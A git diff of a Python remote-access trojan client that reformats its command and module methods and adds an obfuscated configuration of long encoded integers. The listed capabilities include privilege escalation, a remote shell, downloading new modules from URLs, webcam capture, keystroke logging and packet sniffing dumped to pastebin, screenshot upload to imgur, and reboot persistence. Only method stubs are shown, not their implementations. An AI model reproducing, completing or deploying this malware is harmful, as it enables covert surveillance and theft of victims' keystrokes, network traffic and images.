@@ -955,85 +955,139 @@ class Client(object):
 # ------------------ commands --------------------------
 
     @_command
-    def pwd(self): """usage:\t\tpwd\ndescription:\tpresent working directory""" return os.getcwd()
+    def pwd(self):
+        "usage:\t\tpwd\ndescription:\tpresent working directory"
+        return os.getcwd()
 
     @_command
-    def run(self): """usage:\t\trun\ndescription:\trun enabled client modules""" return self._run()
+    def run(self):
+        "usage:\t\trun\ndescription:\trun enabled client modules"
+        return self._run()
 
     @_command
-    def kill(self): """usage:\t\tkill\ndescription:\tkill client""" return self._kill()
+    def kill(self):
+        "usage:\t\tkill\ndescription:\tkill client"
+        return self._kill()
 
     @_command
-    def cd(self, *x): """usage:\t\tcd <path>\ndescription:\tchange directory""" return self._cd(*x)
+    def cd(self, *x):
+        "usage:\t\tcd <path>\ndescription:\tchange directory"
+        return self._cd(*x)
 
     @_command
-    def set(self, x): """usage:\t\tset <module> [option]=[value]\ndescription:\tset module options""" return self._set(x)
+    def set(self, x):
+        "usage:\t\tset <module> [option]=[value]\ndescription:\tset module options"
+        return self._set(x)
 
     @_command
-    def ls(self, *x): """usage:\t\tls <path>\ndescription:\tlist directory contents""" return self._ls(*x)
+    def ls(self, *x):
+        "usage:\t\tls <path>\ndescription:\tlist directory contents"
+        return self._ls(*x)
 
     @_command
-    def admin(self): """usage:\t\tadmin\ndescription:\tattempt to escalate privileges""" return self._admin()
+    def admin(self):
+        "usage:\t\tadmin\ndescription:\tattempt to escalate privileges"
+        return self._admin()
     
     @_command
-    def start(self): """usage:\t\tstart\ndescription:\tstart client""" return self._start()
+    def start(self):
+        "usage:\t\tstart\ndescription:\tstart client"
+        return self._start()
     
     @_command
-    def shell(self): """usage:\t\tshell\ndescription:\trun client shell """ return self._shell()
+    def shell(self):
+        "usage:\t\tshell\ndescription:\trun client shell "
+        return self._shell()
     
     @_command
-    def new(self, x): """usage:\t\tnew <url>\ndescription:\tdownload new module from url""" return self._new(x)
+    def new(self, x):
+        "usage:\t\tnew <url>\ndescription:\tdownload new module from url"
+        return self._new(x)
 
     @_command
-    def show(self, x): """usage:\t\tshow <option>\ndescription:\tshow client attributes""" return self._show(x)
-
-     @_command
-    def standby(self): """usage:\t\tstandby\ndescription:\trevert to standby mode""" return self._standby()
-
-    @_command
-    def wget(self, target): """usage:\t\twget <url>\ndescription:\tdownload file from url""" return self._wget()
+    def show(self, x):
+        "usage:\t\tshow <option>\ndescription:\tshow client attributes"
+        return self._show(x)
 
     @_command
-    def options(self,*arg): """usage:\t\toptions\ndescription:\tdisplay module options""" return self._options(*arg)
+    def standby(self):
+        "usage:\t\tstandby\ndescription:\trevert to standby mode"
+        return self._standby()
 
     @_command
-    def jobs(self): """usage:\t\tjobs\ndescription:\tlist currently active jobs""" return self._show(self._threads)
+    def wget(self, target):
+        "usage:\t\twget <url>\ndescription:\tdownload file from url"
+        return self._wget()
+
+    @_command
+    def options(self,*arg):
+        "usage:\t\toptions\ndescription:\tdisplay module options"
+        return self._options(*arg)
+
+    @_command
+    def jobs(self):
+        "usage:\t\tjobs\ndescription:\tlist currently active jobs"
+        return self._show(self._threads)
     
     @_command
-    def enable(self, module): """usage:\t\tenable <module>\ndescription:\tenable module""" return self._enable(module)
+    def enable(self, module):
+        "usage:\t\tenable <module>\ndescription:\tenable module"
+        return self._enable(module)
 
     @_command
-    def disable(self, module): """usage:\t\tdisable <module>\ndescription:\tdisable module""" return self._disable(module)
+    def disable(self, module):
+        "usage:\t\tdisable <module>\ndescription:\tdisable module"
+        return self._disable(module)
 
     @_command
-    def results(self): """usage:\t\tresults\ndescription:\tshow all modules output""" return self._show(self._result)
+    def results(self):
+        "usage:\t\tresults\ndescription:\tshow all modules output"
+        return self._show(self._result)
 
     @_command
-    def help(self, *args): """usage:\t\thelp [option]\ndescription:\tshow command usage information""" return self._help(args) if len(args) else self._help()
+    def help(self, *args):
+        "usage:\t\thelp [option]\ndescription:\tshow command usage information"
+        return self._help(args) if len(args) else self._help()
 
     @_command
-    def info(self): """usage:\t\tinfo\ndescription:\tget client host machine information""" return self._show(self._info)
+    def info(self):
+        "usage:\t\tinfo\ndescription:\tget client host machine information"
+        return self._show(self._info)
 
     @_command
-    def commands(self): """usage:\t\tcommands\ndescription:\tlist commands with usage help""" return self._help_commands 
+    def commands(self):
+        "usage:\t\tcommands\ndescription:\tlist commands with usage help"
+        return self._help_commands 
 
     @_command
-    def modules(self): """usage:\t\tmodules\ndescription:\tlist modules current status""" return self._help_modules 
+    def modules(self):
+        "usage:\t\tmodules\ndescription:\tlist modules current status"
+        return self._help_modules 
 
     @_module
-    def webcam(self): """usage:\t\twebcam\ndescription:\tremote image/video capture from client webcam""" return self._webcam()
+    def webcam(self):
+        "usage:\t\twebcam\ndescription:\tremote image/video capture from client webcam"
+        return self._webcam()
     
     @_module
-    def keylogger(self): """usage:\t\tkeylogger\ndescription:\tlog client keystrokes remotely and dump to pastebin""" return self._keylogger()
+    def keylogger(self):
+        "usage:\t\tkeylogger\ndescription:\tlog client keystrokes remotely and dump to pastebin"
+        return self._keylogger()
 
     @_module
-    def screenshot(self): """usage:\t\tscreenshot\ndescription:\ttake screenshot + upload to imgur""" return self._screenshot()
+    def screenshot(self):
+        "usage:\t\tscreenshot\ndescription:\ttake screenshot + upload to imgur"
+        return self._screenshot()
 
     @_module
-    def persistence(self): """usage:\t\tpersistence\ndescription:\testablish persistence to relaunch on reboot""" return self._persistence()
+    def persistence(self):
+        "usage:\t\tpersistence\ndescription:\testablish persistence to relaunch on reboot"
+        return self._persistence()
     
     @_module
-    def packetsniffer(self): """usage:\t\tpacketsniffer\ndescription:\tcapture client network traffic and dump to pastebin""" return self._packetsniffer()
+    def packetsniffer(self):
+        "usage:\t\tpacketsniffer\ndescription:\tcapture client network traffic and dump to pastebin"
+        return self._packetsniffer()
 
 # -----------------   main   --------------------------
 
@@ -1042,6 +1096,21 @@ def main(*args, **kwargs):
     return client.start()
 
 if __name__ == '__main__':
-    main()
-
+    config = {
+            "__a__": "296569794976951371367085722834059312119810623241531121466626752544310672496545966351959139877439910446308169970512787023444805585809719",
+            "__c__": "45403374382296256540634757578741841255664469235598518666019748521845799858739",
+            "__b__": "142333377975461712906760705397093796543338115113535997867675143276102156219489203073873",
+            "__d__": "44950723374682332681135159727133190002449269305072810017918864160473487587633",
+            "__e__": "423224063517525567299427660991207813087967857812230603629111",
+            "__g__": "12095051301478169748777225282050429328988589300942044190524181336687865394389318",
+            "__q__": "61598604010609009282213705494203338077572313721684379254338652390030119727071702616199509826649119562772556902004",
+            "__s__": "12095051301478169748777225282050429328988589300942044190524181399447134546511973",
+            "__t__": "5470747107932334458705795873644192921028812319303193380834544015345122676822127713401432358267585150179895187289149303354507696196179451046593579441155950",
+            "__u__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594790118280682200264825",
+            "__v__": "1",
+	    "__w__": "12095051301478169748777225282050429328988589300942044190524179185395659761404742",
+            "__x__": "83476976134221412028591855982119642960034367665148824780800537343522990063814204611227910740167009737852404591204060414955256594956352897189686440057",
+            "__y__": "202921288215980373158432625192804628723905507970910218790322462753970441871679227326585"
+    }
+    main(**config)
 
